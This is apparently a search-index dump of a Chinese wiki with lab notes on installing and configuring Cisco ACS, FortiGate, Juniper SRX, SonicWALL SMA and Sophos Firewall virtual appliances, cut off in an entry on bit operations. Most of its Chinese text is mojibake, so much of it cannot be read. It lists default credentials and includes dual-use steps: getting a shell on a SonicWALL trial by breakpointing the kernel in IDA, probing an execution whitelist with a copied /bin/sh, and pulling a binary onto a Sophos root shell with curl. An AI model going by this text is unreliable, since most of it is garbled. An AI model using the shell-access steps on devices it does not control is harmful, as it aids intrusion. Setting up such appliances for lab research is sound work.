ç¬¬ä¸‰æ–¹ä¸‹è½½ç½‘å€çš„è¯„è®ºåŒºå¯ä»¥çœ‹åˆ°è¿™ä¸ªlicå·²ç»è¿‡æœŸäº†ï¼Œéœ€è¦è‡ªå·±ç”³è¯·ã€‚ ç”³è¯·lic å‚è€ƒï¼š How to Generate a Demo or Evaluation License for Identity Services Engine (ISE) How to get Cisco ACS trial license https://www.cisco.com/go/license ç™»å½•è´¦å· æœaccess cï¼Œé€‰ ç‚¹ä¸‹è½½ï¼Œé‚®ç®±ä¸­ä¹Ÿä¼šæ”¶åˆ° å®‰è£… å‚è€ƒï¼š Installation and Upgrade Guide for Cisco Secure Access Control System 5.8.1 How to Install Cisco ACS In VMware Workstation- Part 1 Initial Configuration Of ACS 5.8 In Vmware Workstation Part 2 ç”¨VMåˆ›å»ºè‡ªå®šä¹‰è™šæ‹Ÿæœºï¼Œ æˆ–CentOS 7 x64ï¼Œä¹Ÿå¯ä»¥ å¤„ç†å™¨è¿™é‡Œæˆ‘é€‰çš„æ•°é‡1ï¼Œå†…æ ¸æ•°é‡2 RAMï¼Œæ–‡æ¡£è¯´æœ€å°‘4GB å…¶ä½™é»˜è®¤ï¼Œç‚¹ä¸‹ä¸€æ­¥ ç£ç›˜æ–‡æ¡£è¯´æœ€å°‘60GBï¼Œæœ€å¤§å¯ä»¥åˆ°750Gï¼Œæˆ‘è¿™é‡Œé€‰çš„60GB. å¿«å®Œæˆå‰CD/DVDï¼Œé€‰æ‹©isoæ–‡ä»¶ã€‚ éšåå¼€æœºã€‚ é€‰é¡¹1æ˜¯ä¸ºä½¿ç”¨é”®ç›˜å’Œæ˜¾ç¤ºå™¨çš„å®‰è£…è®¾è®¡çš„,å¦‚æœæ‚¨æ­£åœ¨ä½¿ç”¨é”®ç›˜å’Œæ˜¾ç¤ºå™¨è¿›è¡Œå®‰è£…ï¼Œé‚£ä¹ˆé€‰æ‹©é€‰é¡¹1; é€‰é¡¹2æ˜¯ä¸ºä½¿ç”¨ä¸²è¡Œæ§åˆ¶å°çš„å®‰è£…è®¾è®¡çš„ã€‚ä¸²è¡Œæ§åˆ¶å°é€šå¸¸ç”¨äºè¿œç¨‹ç®¡ç†æˆ–è€…æ²¡æœ‰ç›´æ¥ç‰©ç†æ¥å…¥çš„æƒ…å†µ,å¦‚æœæ‚¨æ­£åœ¨ä½¿ç”¨ä¸²è¡Œæ§åˆ¶å°è¿›è¡Œå®‰è£…ï¼Œé‚£ä¹ˆé€‰æ‹©é€‰é¡¹2ã€‚ é€‰æ‹©é€‰é¡¹1 setup è¾“å…¥setupï¼Œ[Enter]ï¼Œè¿›å…¥é…ç½®ç•Œé¢ é…ç½®é¡¹ å†…å®¹ å¤‡æ³¨ name ACS IP address 192.168.147.191 netmask 255.255.255.0 gateway 192.168.147.2 DNS domain cisco.com ä¸èƒ½æ˜¯ipåœ°å€ primary nameserver 8.8.8.8 secondary nameserver 192.168.147.2 NTP Enter å°±æ˜¯é»˜è®¤çš„ system timezone Enter SSH Y username admin password P@ssw0rd éšåä¼šåˆå§‹åŒ–ç½‘ç»œæ¥å£ï¼Œå°è¯•è¿é€šä¸Šé¢é…çš„ip/åŸŸå å¦‚æœå®ƒæ˜¾ç¤ºè¿æ¥ä¸åˆ°NTPæœåŠ¡å™¨ï¼Œè€Œä½ æ²¡æœ‰åŒæ­¥æ—¶é—´çš„éœ€æ±‚ï¼Œé€‰æ‹©Nå¿½ç•¥ã€‚ éšåé‡å¯ï¼Œä½¿ç”¨å‰é¢é…ç½®çš„è´¦å·å’Œå¯†ç ç™»å½• æ˜¾ç¤ºç½‘ç»œæ¥å£çš„å‘½ä»¤ 1show interface ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼š show application status acsï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæ˜¾ç¤ºACSåº”ç”¨çš„çŠ¶æ€ã€‚å®ƒä¼šæä¾›å…³äºACSæœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œï¼Œä»¥åŠå®ƒä»¬çš„è¿è¡ŒçŠ¶æ€çš„ä¿¡æ¯ã€‚ acs start å’Œ acs stopï¼šè¿™ä¸¤ä¸ªå‘½ä»¤åˆ†åˆ«ç”¨äºå¯åŠ¨å’Œåœæ­¢ACSåº”ç”¨ã€‚ acs reset-configï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºé‡ç½®ACSé…ç½®åˆ°å‡ºå‚é»˜è®¤è®¾ç½®ã€‚ show running-configï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæ˜¾ç¤ºå½“å‰çš„è¿è¡Œé…ç½®ã€‚ backup å’Œ restoreï¼šè¿™ä¸¤ä¸ªå‘½ä»¤åˆ†åˆ«ç”¨äºå¤‡ä»½å’Œæ¢å¤ACSé…ç½®å’Œæ•°æ®ã€‚ è§£å†³é«˜ç‰ˆæœ¬æµè§ˆå™¨æ— æ³•è®¿é—®webç•Œé¢ï¼ˆæœªæˆåŠŸï¼‰ å‚è€ƒï¼šUnable to Access CSACS 5.3 Web Interfaceâ€¦ VMwareå¦‚ä½•å®‰è£…Cisco ACS5.3å¹¶æ¿€æ´» ä½¿ç”¨show application status acså‘½ä»¤è§‚å¯Ÿåˆ°æ‰€æœ‰ç›¸å…³è¿›ç¨‹å·²å¤„äºrunningçŠ¶æ€åï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®http://&lt;acsçš„ipåœ°å€&gt;å´æ— æ³•è®¿é—®ï¼Œåƒè¿™æ ·ï¼š åŸå› ï¼š After additional troubleshooting, it was discovered that the MS Internet Explorer patch associated with MS Security Advisory 2661254 just so happened to be the culprit. This restricts the use of certificates with RSA keys less than 1024 bits in length. The default management certificate just so happens to be 512 bits in length. è§£å†³åŠæ³•ï¼š Using FireFox, I navigated to System Administration &gt; Configuration &gt; Local Server Certificates &gt; Local Certificates. I then proceeded to add a certificate in the following steps: Select Generate Self Signed Certificate &amp; click next Populate the Certifcate Subject field with the appropriate DN information of the ACS server. Change the key length to 1024 or above. Check &quot;Management Interface: Used to authenticate the web server (GUI). Check â€œReplace Certificateâ€. Click Finish. The ACS server should then generate the new certifcate, replace the existing management certificate, and restart the ACS processes. After everything is back up, you shouldnâ€™t have any issues in accessing the web interface. æ‰¾äº†ä¸€å°åŒåœ¨NATæ¨¡å¼ä¸‹çš„win7 x86çš„ieè¿›è¡Œè®¿é—® é»˜è®¤è´¦å·ï¼šacsadminï¼Œé»˜è®¤å¯†ç ï¼šdefaultï¼Œç¬¬ä¸€æ¬¡è¿›å»ä¼šè¢«è¦æ±‚é‡ç½®å¯†ç ï¼ŒæŒ‰æç¤ºè¿›è¡Œå³å¯ã€‚æ”¹ä¸ºäº†ï¼šP@ssw0rdã€‚ Cisco Secure ACS License Registrationé“¾æ¥å°±æ˜¯ä¹‹å‰å†™çš„https://www.cisco.com/go/license ä¸Šä¼ å…ˆå‰ç”³è¯·çš„çš„licæ–‡ä»¶ é…ç½®ä¸€ä¸ªèƒ½ç”¨å¼ºåº¦é«˜ç‚¹çš„çš„è¯ä¹¦ CN=åé¢éšä¾¿å†™ä¸€ä¸ªï¼Œæ¯”å¦‚CN=USã€‚ é•¿åº¦è¦å¤§äº1024 æ‰“ä¸¤ä¸ªâˆš ç›®å‰æƒ…å†µï¼š ä½†ç”¨é«˜ç‰ˆæœ¬æµè§ˆå™¨è¿˜æ˜¯è®¿é—®ä¸äº†ã€‚å…ˆè¿™æ ·ï¼Œåç»­æœ‰éœ€æ±‚å†çœ‹ å¤‡é€‰æ–¹æ¡ˆ è¯•äº†åœ¨è®¿é—®webé¡µé¢çš„ç”µè„‘ï¼Œç®¡ç†å‘˜cmdæ‰§è¡Œ 1certutil -setreg chain\\minRSAPubKeyBitLength 512 é‡å¯åå†æ¬¡è®¿é—®ï¼Œè¿˜æ˜¯ é“¾æ¥è®°å½• User Guide for Cisco secure Access Control System 5.8.1"},{"title":"FortiGate VM","path":"/wiki/network_security_devices_env/FortiGate_VM.html","content":"æ¦‚å¿µ Fortinetæ˜¯ä¸€å®¶ç½‘ç»œå®‰å…¨å…¬å¸ï¼Œè¯¥å…¬å¸çš„ç¬¬ä¸€ä¸ªä¹Ÿæ˜¯ä¸»è¦äº§å“æ˜¯ç‰©ç†é˜²ç«å¢™FortiGateã€‚ ä¹Ÿæœ‰çœ‹åˆ°FortiFirewallï¼ˆç®€å†™FFWï¼‰å’ŒFortiGateï¼ˆç®€å†™FGTï¼‰çš„è¯´æ³•ï¼Œæ²¡çœ‹æ˜ç™½ã€‚ è™šæ‹Ÿæœºä¸‹è½½ å‚è€ƒï¼šåœ¨Esxiä¸Šå®‰è£…é£å¡”Fortigateè™šæ‹Ÿæœºçš„æ•™ç¨‹ FortinetæŠ€æœ¯æ”¯æŒä¸­å¿ƒï¼šhttps://support.fortinet.com æ³¨å†Œè´¦å·åï¼Œé€‰æ‹©Support-&gt;VM Imagesè¿›å…¥åˆ°è™šæ‹Ÿæœºä¸‹è½½é¡µé¢ å¹³å°é€‰æ‹©ESXI æœ‰å››ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯FortiFirewallå®‰è£…æ–‡ä»¶å’Œå‡çº§æ–‡ä»¶ï¼ŒFortiGateå®‰è£…æ–‡ä»¶å’Œå‡çº§æ–‡ä»¶ â€œUpgrade from previous version of FortiFirewall for VMWareâ€ï¼šè¿™æ˜¯ç”¨äºå‡çº§å·²æœ‰çš„FortiFirewallè™šæ‹Ÿæœºçš„æ–‡ä»¶ã€‚å¦‚æœä½ å·²ç»åœ¨VMware ESXiä¸Šè¿è¡Œäº†æ—§ç‰ˆæœ¬çš„FortiFirewallï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶è¿›è¡Œå‡çº§ã€‚ â€œNew deployment of FortiFirewall for VMwareâ€ï¼šè¿™æ˜¯ç”¨äºåœ¨VMware ESXiä¸Šæ–°éƒ¨ç½²FortiFirewallçš„æ–‡ä»¶ã€‚å¦‚æœä½ æ‰“ç®—æ–°å®‰è£…FortiFirewallï¼Œä½ åº”è¯¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ã€‚ â€œUpgrade from previous version of FortiGate for VMwareâ€ï¼šè¿™æ˜¯ç”¨äºå‡çº§å·²æœ‰çš„FortiGateè™šæ‹Ÿæœºçš„æ–‡ä»¶ã€‚å¦‚æœä½ å·²ç»åœ¨VMware ESXiä¸Šè¿è¡Œäº†æ—§ç‰ˆæœ¬çš„FortiGateï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶è¿›è¡Œå‡çº§ã€‚ â€œNew deployment of FortiGate for VMwareâ€ï¼šè¿™æ˜¯ç”¨äºåœ¨VMware ESXiä¸Šæ–°éƒ¨ç½²FortiGateçš„æ–‡ä»¶ã€‚å¦‚æœä½ æ‰“ç®—æ–°å®‰è£…FortiGateï¼Œä½ åº”è¯¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ã€‚ What is the difference between FGT and FFW ? ä¸‹è½½New deployment of FortiFirewall for VMwareï¼Œè§£å‹åæœ‰å¤šä¸ªovfæ–‡ä»¶ï¼Œæ ¹æ®è‡ªå·±çš„å¹³å°é€‰æ‹©ç›¸åº”çš„ovfæ–‡ä»¶ï¼Œåœ¨readmeä¸­å¯ä»¥çŸ¥é“æ¯ä¸ªovfæ”¯æŒçš„ESXIå’ŒVMç‰ˆæœ¬ 12345678910111213141516171819Compatibilities of different OVF templates:|-----------------------------------------+-------------------------------------------|| Template | Compatible with ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.ovf | ESXI 8.0(Hardware Version 20) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.hw13.ovf | ESXI 6.5(Hardware Version 13) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.hw15.ovf | ESXI 6.7U2+(Hardware Version 15) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.hw17.ovf | ESXI 7.0(Hardware Version 17) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.vapp.ovf | ESXI 8.0(Hardware Version 20) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.nsxt.ovf | ESXI 6.7U2+(Hardware Version 15) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64-ZNTA.vapp.ovf | ESXI 7.0(Hardware Version 17) or later ||-----------------------------------------+-------------------------------------------| å¯åŠ¨åŠé…ç½® å¯åŠ¨ è½½å…¥ovfåï¼Œé»˜è®¤æ˜¯10å¼ ç½‘å¡ï¼Œä»ç½‘å¡1å¼€å§‹æ”¹ä¸ºè‡ªå·±è¦ç”¨çš„æ¨¡å¼ï¼Œæ¯”å¦‚NATï¼Œæˆ–å…¶ä»–æ¨¡å¼ã€‚ åé¢licenseéœ€è¦FGTèƒ½è®¿å¤–ç½‘ é…ç½® åºåˆ—å·ï¼š å¼€æœºååˆå§‹è´¦å·å’Œå¯†ç æ˜¯amdin/ç©ºï¼Œç¬¬ä¸€æ¬¡ç™»å½•éœ€è¦ä¿®æ”¹å¯†ç  å·²ä¿®æ”¹ä¸ºï¼šadmin/123456 æˆ‘å°†ç¬¬ä¸€å¼ ç½‘å¡æ”¹æˆäº†NATæ¨¡å¼ show system interfaceï¼šæ˜¾ç¤ºç³»ç»Ÿæ¥å£çš„ä¿¡æ¯ é»˜è®¤æ˜¯dhcpæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹ä¸èƒ½ç›´æ¥è®¾ipï¼Œè¦å…ˆæ”¹ä¸ºé™æ€ipæ¨¡å¼ï¼Œå®Œæ•´å‘½ä»¤å¦‚ä¸‹ï¼š 123456config system interface edit port1 set mode static set allowaccess ping http https ssh telnet set ip 192.168.147.190/24 end é…ç½®ipå‚è€ƒï¼šhttps://cloud.tencent.com/developer/ask/sof/108409533 DNSé…ç½® æ˜¾ç¤ºç³»ç»Ÿçš„DNS 1show system dns ä¿®æ”¹dns 1234config system dns set primary 192.168.147.135 set secondary 192.168.147.2 end è·¯ç”±é…ç½® æ˜¾ç¤ºç³»ç»Ÿé»˜è®¤ç½‘å…³ 1get router info routing-table all é…ç½®è·¯ç”± è¿™ä¸€æ­¥ä¸å¼„çš„è¯FortiGateæ²¡æ³•å°†æµé‡è·¯ç”±åˆ°äº’è”ç½‘ï¼Œä¼špingä¸é€šé™¤äº†192.168.147.1/24å…¶ä»–æ®µçš„ipåœ°å€ï¼Œæ˜¾ç¤ºunreachableã€‚ licenseæ—¶ä¼šcurlå¤±è´¥ 12345config router static edit 1 set gateway 192.168.147.2 set device port1 end éªŒè¯èƒ½å¦è®¿é—®äº’è”ç½‘ åœ¨FortiGateçš„å‘½ä»¤è¡Œç•Œé¢ï¼ˆCLIï¼‰ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥éªŒè¯FortiGateæ˜¯å¦èƒ½è®¿é—®äº’è”ç½‘ï¼š execute ping &lt;IPåœ°å€æˆ–åŸŸå&gt;ï¼šè¿™ä¸ªå‘½ä»¤å¯ä»¥ç”¨æ¥æµ‹è¯•FortiGateæ˜¯å¦èƒ½å¤Ÿåˆ°è¾¾æŒ‡å®šçš„IPåœ°å€æˆ–åŸŸåã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥è¾“å…¥execute ping 8.8.8.8æˆ–execute ping www.google.comæ¥æµ‹è¯•æ˜¯å¦èƒ½å¤Ÿè®¿é—®Googleçš„DNSæœåŠ¡å™¨æˆ–ç½‘ç«™ã€‚ execute traceroute &lt;IPåœ°å€æˆ–åŸŸå&gt;ï¼šè¿™ä¸ªå‘½ä»¤å¯ä»¥ç”¨æ¥è·Ÿè¸ªæ•°æ®åŒ…ä»FortiGateåˆ°æŒ‡å®šçš„IPåœ°å€æˆ–åŸŸåçš„è·¯å¾„ã€‚è¿™å¯ä»¥å¸®åŠ©ä½ è¯†åˆ«ç½‘ç»œä¸­çš„é—®é¢˜ã€‚ è¯·æ³¨æ„ï¼ŒFortiGate CLIå¹¶ä¸æ”¯æŒcurlå‘½ä»¤ã€‚å¦‚æœä½ éœ€è¦æµ‹è¯•HTTPè¿æ¥ï¼Œä½ å¯èƒ½éœ€è¦ä½¿ç”¨å…¶ä»–å·¥å…·æˆ–æ–¹æ³•ã€‚ ç”¨æµè§ˆå™¨è®¿é—®https://192.168.147.190:443ï¼Œè´¦æˆ·å¯†ç å’ŒCLIä¸€æ · full license ä¸ªäººä¸­å¿ƒï¼ŒRegister Now è¾“å…¥åœ¨è™šæ‹Ÿæœºä¸­çœ‹åˆ°çš„åºåˆ—å·ï¼Œéæ”¿åºœç”¨æˆ· è¾“å…¥æ—¶è¯´æˆ‘çš„åºåˆ—å·æ— æ•ˆï¼Ÿï¼Ÿï¼Ÿ https://docs.fortinet.com/document/fortigate-private-cloud/7.4.0/kvm-administration-guide/170480/fortigate-vm-models-and-licensing evaluation license è¾“å…¥æ³¨å†Œçš„è´¦å·å’Œå¯†ç ï¼Œç‚¹å‡»OKæŒ‰é’® ä¸æ­¤åŒæ—¶ï¼Œè™šæ‹Ÿæœºæ˜¾ç¤ºåœ¨è¯·æ±‚FortiCare troubleshootingå¦‚æœç½‘é¡µæŠ¥é”™ï¼Œçœ‹ä¸€ä¸‹è™šæ‹Ÿæœºçš„æŠ¥é”™ä¿¡æ¯ã€‚ä¸‹å›¾è¿™ç§æ˜¯ç½‘ç»œé…ç½®é—®é¢˜ï¼šè´¦æˆ·å¯†ç è¾“é”™ï¼šå·²ç»ç”³è¯·è¿‡çš„è´¦å·ï¼Œå¯¹æ–°çš„ä¸€å°FortiGateå†æ¬¡è¾“å…¥ï¼š æ³¨å†ŒæˆåŠŸåè´¦å·ä¸­å¿ƒçš„product listä¼šå¤šå‡ºä¸€æ  å…¶ä»–å‘½ä»¤è®°å½• 1get system status ä¼šæ˜¾ç¤ºä¸€äº›å…³äºFortiGateç³»ç»Ÿçš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬å·ã€åºåˆ—å·ã€æ“ä½œæ¨¡å¼ã€Uptimeç­‰ FortiGate é£å¡”é˜²ç«å¢™å¸¸ç”¨å‘½ä»¤"},{"title":"Juniper SRXè®¾å¤‡","path":"/wiki/network_security_devices_env/Juniper_SRXè®¾å¤‡.html","content":"æ ·ä¾‹è´¦å·å¯†ç  root/Admin@123 é…ç½® å‚è€ƒï¼šhttps://www.juniper.net/documentation/us/en/software/vsrx/vsrx-consolidated-deployment-guide/vsrx-contrail/topics/task/security-vsrx-cli-configuring.html https://www.cnblogs.com/lisenlin/p/10302318.html To configure the vSRX instance using the CLI: Verify that the vSRX is powered on. Log in as the root user. There is no password. Start the CLI. 12root#cliroot@&gt; Enter configuration mode. 123configure [edit]root@# Use â€œcommitâ€ command to apply candidate configuration as active configuration. Set the root authentication password by entering a cleartext password, an encrypted password, or an SSH public key string (DSA or RSA). 1234[edit]root@# set system root-authentication plain-text-passwordNew password: password Retype new password: password Configure the traffic interfaces. 1set interfaces ge-0/0/0 unit 0 family inet address 192.168.242.239/24 Configure the default gateway 1set routing-options static route 0.0.0.0/0 next-hop 192.168.242.1 This command creates a static route for all addresses (0.0.0.0/0) with a next hop of 192.168.242.1, which is your default gateway. dhcpï¼š Configure the management interface. 12[edit]root@# set interfaces fxp0 unit 0 family inet dhcp-client Configure the traffic interfaces. 12[edit]root@# set interfaces ge-0/0/0 unit 0 family inet dhcp-client Configure basic security zones and bind them to traffic interfaces. 1set security zones security-zone trust interfaces ge-0/0/0.0 é…ç½®å…è®¸è®¿é—®æ¥å£çš„å“ªäº›æœåŠ¡ 12set security zones security-zone trust host-inbound-traffic system-services allset security zones security-zone trust host-inbound-traffic protocols all 12set security zones security-zone trust interfaces ge-0/0/0.0 host-inbound-traffic system-services allset security zones security-zone trust interfaces ge-0/0/0.0 host-inbound-traffic protocols all æŸ¥çœ‹æ¥å£ä¿¡æ¯ 1show interfaces ge-0/0/0.0 é…ç½®HTTPç™»å½•ã€HTTPSç™»å½•ã€sshç™»å½• 1set system services web-management http interface ge-0/0/0.0 12set system services web-management https system-generated-certificateset system services web-management https interface ge-0/0/0.0 1set system services ssh Verify the configuration. 123[edit]root@# commit checkconfiguration check succeeds quitæˆ–exité€€å‡º this command displays interface-specific information like IP address and status. 1show interfaces ge-0/0/0.0 This will display all the security zones and their associated settings 1show security zones If you want to see the specific security settings for the â€˜trustâ€™ zone, you can use the command show security zones security-zone trust. This will display the interfaces associated with the trust zone and the services and protocols that are allowed inbound to the interfaces in this zone. show | display set operational mode 1show interfaces ge-0/0/0 terse 1show interfaces ge-0/0/0 detail æŸ¥çœ‹ipï¼ˆå¦‚æœå±å¹•å¤ªå°ï¼Œè¾“å‡ºå¤ªå¤šï¼‰ 1ifconfig | less webç®¡ç†é¡µé¢ dashboardå¯ä»¥æŸ¥çœ‹åˆ°ç‰ˆæœ¬ ç™½åå•æœºåˆ¶ éªŒè¯ç™½åå•æœºåˆ¶å­˜åœ¨ï¼š å°†/bin/shç§»åŠ¨åˆ°/tmp/sh 1cp /bin/sh /tmp/sh ç„¶å 1cd /tmp 1./sh ä¼šæŠ¥æƒé™error"},{"title":"SonicWALL SMAè®¾å¤‡","path":"/wiki/network_security_devices_env/SonicWALL_SMAè®¾å¤‡.html","content":"å®˜ç½‘åœ°å€ ç™»å½•é¡µé¢ https://www.mysonicwall.com/ äº§å“è¯•ç”¨ï¼š å°è¯•èƒ½å¦è¿æ¥åˆ°è®¸å¯è¯æœåŠ¡å™¨ https://www.sonicwall.com/support/knowledge-base/error-license-manager-ssl-connection-failed-please-check-your-internet-connection-and-dns-settings/170502913153712/ æ¡¥æ¥ï¼Œå¤åˆ¶åˆ°ç½‘ç»œè¿æ¥ã€‚æ‰‹æœºå¼€çƒ­ç‚¹ï¼Œå®ä½“ç”µè„‘è¿æ‰‹æœºçƒ­ç‚¹ system&gt;licenseï¼Œè¾“å…¥è´¦å·å’Œå¯†ç ï¼Œç„¶åå¡«å†…å®¹ é»˜è®¤å¯†ç  ç½‘é¡µï¼š443 é»˜è®¤å¯†ç ï¼š admin/password sshï¼šroot/password è¯•ç”¨ç‰ˆä¸å¼€æ”¾sshï¼Œå¯ä»¥idaæ–­ç‚¹å†…æ ¸è¿›å»æ‹¿shell å‡çº§ â€œSystemâ€-â€œSettingsâ€ ä¸Šä¼ sigæ–‡ä»¶ï¼Œbootè¿™ä¸ªsigæ–‡ä»¶ï¼Œä¸æ¢å¤é»˜è®¤é…ç½® ovfåŠsigæ–‡ä»¶ä¸‹è½½ å‚è€ƒé“¾æ¥ï¼šhttps://www.sonicwall.com/support/knowledge-base/how-to-download-sra-smb-ova-file-for-your-virtual-appliance-from-mysonicwall/170502718367497/ æ—¥å¿—æŸ¥çœ‹ å¼€äºŒæ¬¡éªŒè¯ å‚è€ƒï¼šhttps://www.sonicwall.com/support/knowledge-base/how-do-i-configure-2fa-for-ssl-vpn-with-totp/190829123329169/ ç»å…¸æ¨¡å¼"},{"title":"Sophos Firewall","path":"/wiki/network_security_devices_env/Sophos_Firewall.html","content":"å®‰è£… Sophos Firewall offers a virtual machine version, and the documentation can be found at this link. You need to register an account to download the ovf file.After downloading the compressed file, you will find different OVF files with different names, each of them prepared for different virtual platforms. Hereâ€™s a brief description of each one: sf_virtual.ovf - This is the standard OVF file for use with VMware vSphere. It includes support for the VMware virtual hardware version 10. sf_virtual_vm7.ovf - This OVF file is for use with VMware Workstation 7 and VMware Player 3. It includes support for the VMware virtual hardware version 7. sf_virtual_vm8.ovf - This OVF file is for use with VMware Workstation 8 and later versions, including VMware Player 4 and later versions. It includes support for the VMware virtual hardware version 8. sf_virtual_vm8_paravirtual.ovf - This OVF file is for use with VMware Workstation 8 and later versions, including VMware Player 4 and later versions. It includes support for the VMware virtual hardware version 8 and includes the VMware Paravirtual SCSI controller. sf_virtual_virtualbox.ovf - This OVF file is for use with Oracle VirtualBox. It includes support for the VirtualBox virtual hardware version 4. To install the Sophos Firewall virtual appliance on VMware 16.1, you should use the sf_virtual_vm8.ovf file since it is compatible with VMware Workstation 8 and later versions. You can import this OVF file into VMware Workstation to create a virtual machine for the Sophos Firewall. Installation guide Sophos Firewall is designed to act as a gateway between different network segments, and having multiple network interfaces allows it to separate and manage traffic between these segments more efficiently. For example, you could have one interface connected to your LAN, another connected to your DMZ (demilitarized zone) network, and a third connected to the internet. This would allow Sophos Firewall to manage traffic between these segments and enforce security policies to protect your network. To skip the online update process, you can disconnect the network before opening the web page for the first time. LANï¼š192.168.242.242 WANï¼š192.168.147.134 ç”¨æˆ·ï¼šadmin å¯†ç ï¼šAdmin@1234 Firewall nameï¼šSophos_XG_Firewall America/Chicago admin@domainname.com Pass@forMail123 Configuration summary: 1234567891011121314151617181920212223Basic settingsHostname: Sophos_XG_FirewallTime zone: America/Chicago Network settingsInternet connection: DHCP on PortBLocal network: PortAIP: 192.168.242.242/255.255.255.0DHCP disabled #Default_Network_Policy has been created with:Scan HTTP: EnableUse zero-day protection: EnableWeb policy: Default PolicyIntrusion prevention: lantowan_generalCreated linked NAT rule &quot;#NAT_Default_Network_Policy&quot; with source translated to MASQ. Notifications and backups:Send configuration backup every week: EnableBuilt-in email serverRecipient&#x27;s email address: admin@domainname.comSender&#x27;s email address: admin@domainname.com sshæƒé™ 5-3ï¼Œè¿›å…¥shellã€‚ ç”¨winscpæ²¡æ³•ä¼ æ–‡ä»¶ï¼š sshåç»ˆç«¯æ˜¯rootæƒé™ï¼ŒWinSCPç™»å½•åæ˜¯adminã€‚adminè¿˜æ˜¯å’Œrootä¸ä¸€æ ·ã€‚æˆ‘è¯•äº†ç”¨WinSCPä¼ è¾“æŠ¥é”™error3ï¼Œpermission deniedã€‚ æ¢ä¸€ç§æ–¹æ³•ï¼šèµ·httpæœåŠ¡ä¼  åœ¨å·¥å…·ç›®å½•ç”¨python2èµ·ä¸€ä¸ªhttpæœåŠ¡ 1python -m SimpleHTTPServer 8080 ç„¶årootç»ˆç«¯ä¸­ç”¨curlä¸‹è½½è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ 1curl 192.168.242.129:8080/demo -o demo æ²¡åŠ -oçš„æŠ¥é”™ 1234SF01V_VM01_SFOS 19.5.1 MR-1-Build278# curl 192.168.242.129:8080/demoWarning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tellWarning: curl to output it to your terminal anyway, or consider &quot;--outputWarning: &lt;FILE&gt;&quot; to save to a file. æˆ–è€…wgetï¼ˆè¿˜æ²¡è¯•è¿‡ï¼‰ ç›®å‰å·²çŸ¥çš„ä¸¤ä¸ªæœ‰æ‰§è¡Œæƒé™çš„ç›®å½•ï¼š/var/æˆ–/content/ä¸‹ shellå‘½ä»¤ æŸ¥çœ‹æƒé™ï¼Œæ²¡æœ‰whoamiå‘½ä»¤ï¼Œå¯ä»¥ç”¨idæŸ¥çœ‹ å‡çº§ webé¡µé¢ï¼ŒBackup&amp;firmwareï¼Œæœ‰ä¸¤ç§å‡çº§æ–¹å¼ æ–¹å¼ä¸€ï¼šè‡ªè¡Œä¸Šä¼ firmware æ–¹å¼äºŒï¼šä»ç½‘ç»œä¸Šä¸‹è½½firmwareï¼Œç„¶åinstallï¼ˆä½¿ç”¨VPNä¸‹è½½é€Ÿåº¦ä¼šå¿«ï¼‰ both of these options can be considered upgrades, but they serve slightly different purposes: Manually Uploading Firmware and Switching Partitions: This feature allows administrators to manually download a specific firmware version from the Sophos website (or any other source), and then upload it to the firewall. This can be useful in scenarios where the firewall does not have direct internet access to download the latest firmware or when a specific firmware version is required. Switching partitions refers to the process of changing the active firmware partition. Sophos XG Firewalls generally maintain two firmware partitions - one for the active firmware and one for the auxiliary firmware. This allows a backup firmware to be stored and readily available in case thereâ€™s an issue with the active firmware. Latest Available Firmware: This feature is more straightforward. The firewall itself checks for the latest available firmware from Sophos, downloads it, and then installs it. This requires that the firewall has internet access. This option is generally more convenient and ensures that the firewall is always up-to-date with the latest security patches and features. å‚è€ƒï¼š webåå°-Backup&amp;firmware https://www.t-tech.com.tw/b1page-b1_25035-b1--1545.html https://doc.sophos.com/nsg/sophos-firewall/18.5/Help/en-us/webhelp/onlinehelp/AdministratorHelp/BackupAndFirmware/Firmware/FirmwareMoveToDifferentVersion/index.html#introduction æ—¥å¿— View the logï¼š LogViewï¼šDiagnostics-&gt;Tools-&gt;Log viewer é…ç½®ä¸€ä»¶ACLå¹¶è®©æ—¥å¿—ç®¡ç†å™¨è®°å½•å®ƒï¼š Administration-Device access Local service ACL exception rule ADD è¿™æ¡ACLè§„åˆ™ä¸ºç¦æ­¢æ¥æºipä¸º192.168.242.147æ¥ping Sophos WALL XG &quot;System services&quot;-â€œLog settingsâ€ï¼Œåœ¨è¿™é‡Œé…ç½®è®°å½•â€œLocal ACLsâ€äº‹ä»¶"},{"title":"ä½è¿ç®—","path":"/wiki/representation_and_computation_of_data/ä½è¿ç®—.html","content":"ä½è¿ç®— è®¡ç®—æœºåªè®¤è¯†0å’Œ1ï¼Œè®¡ç®—æœºèƒ½åšçš„è¿ç®—å½’æ ¹ç»“åº•ä¹Ÿå°±æ˜¯ç›´æ¥å¯¹0å’Œ1åšè¿ç®—(é€šå¸¸ç§°ä¸ºä½è¿ç®—)ï¼Œä¸¾ä¾‹æ¥è¯´ï¼š2+3= ?2-3=?è®¡ç®—æœºéƒ½æ˜¯é€šè¿‡ä½è¿ç®—å®ç°çš„! ä¸ ä¸¤ä¸ªä½éƒ½ä¸º1ï¼Œç»“æœæ‰ä¸º1 ç”¨é€”ï¼šæ©ç maskã€‚å–å‡ºæŸä¸ªæ•°çš„ç¬¬å‡ 